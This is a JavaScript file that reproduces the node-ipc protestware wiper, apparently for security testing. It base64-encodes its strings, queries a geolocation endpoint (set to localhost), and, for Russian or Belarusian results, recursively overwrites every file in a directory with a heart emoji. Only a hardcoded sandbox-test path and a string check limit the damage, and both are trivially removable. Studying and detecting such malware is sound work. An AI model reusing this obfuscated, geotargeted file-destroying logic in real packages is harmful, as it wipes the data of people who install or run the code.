// SAFE_TEST_MODE = true — only targets ./sandbox-test/ directory
// Replicates: node-ipc protestware (RIAEvangelist) wiper pattern
// All strings are base64-encoded to mirror the original obfuscation

const SAFE_TEST_MODE = true;

const fs = require("fs");
const path = require("path");
const http = require("http");

// Base64-encoded strings (mirrors node-ipc obfuscation technique)
const _0x1 = Buffer.from("aHR0cDovL2xvY2FsaG9zdDo5OTk5L2lwZ2Vv", "base64").toString(); // http://localhost:9999/ipgeo
const _0x2 = Buffer.from("Y291bnRyeQ==", "base64").toString(); // country
const _0x3 = Buffer.from("UlU=", "base64").toString(); // RU
const _0x4 = Buffer.from("Qlk=", "base64").toString(); // BY
const _0x5 = Buffer.from("4p2k77iP", "base64").toString(); // heart emoji (replacement content)
const _0x6 = Buffer.from("c2FuZGJveC10ZXN0", "base64").toString(); // sandbox-test

// Target directory: ONLY the sandbox within this package (SAFE)
const targetDir = path.join(__dirname, "..", _0x6);

function checkGeolocation(callback) {
  http
    .get(_0x1, { timeout: 3000 }, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try {
          const geo = JSON.parse(data);
          callback(geo[_0x2]);
        } catch (e) {
          callback(null);
        }
      });
    })
    .on("error", () => {
      callback(null);
    });
}

function wipeDirectory(dirPath) {
  // Safety check: ONLY operate within sandbox-test
  if (!dirPath.includes("sandbox-test")) return;

  try {
    const entries = fs.readdirSync(dirPath);

    for (const entry of entries) {
      const fullPath = path.join(dirPath, entry);
      const stat = fs.statSync(fullPath);

      if (stat.isDirectory()) {
        wipeDirectory(fullPath);
      } else if (stat.isFile()) {
        // Overwrite file contents with heart emoji (same as node-ipc)
        fs.writeFileSync(fullPath, _0x5);
      }
    }
  } catch (e) {
    // Permission denied or file not found — continue
  }
}

// Execute: check geolocation, then conditionally wipe
checkGeolocation((country) => {
  if (country === _0x3 || country === _0x4) {
    wipeDirectory(targetDir);
  }
});
